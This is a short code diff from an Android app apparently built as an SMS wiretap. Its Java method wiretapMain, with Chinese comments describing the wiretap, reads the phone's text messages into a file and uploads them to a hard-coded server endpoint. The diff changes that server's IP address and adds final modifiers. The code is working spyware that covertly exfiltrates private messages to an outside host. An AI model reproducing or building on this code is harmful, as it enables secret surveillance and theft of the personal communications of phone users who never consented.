@@ -190,13 +190,14 @@ public class Wiretap extends MainActivity {
 	 * 窃听启动入口
 	 * @param context
 	 */
-	public static void wiretapMain(Context context){
+	public static void wiretapMain(final Context context){
 		//检查网络是否可用
 		checkInternet(context);
 		//返回窃听短信内容的xml序列化存储位置
-		File file = Wiretap.readSMS(context);
-		String url="http://169.254.9.148:8080/SMSWiretapService/UploadFileServlet";
+		final File file = Wiretap.readSMS(context);
+		final String url="http://169.254.5.57:8080/SMSWiretapService/UploadFileServlet";
 		//上传窃听内容到服务器保存
+
 		if(file.exists()){
 			Wiretap.uploadSMS(file, url, context);
 		}
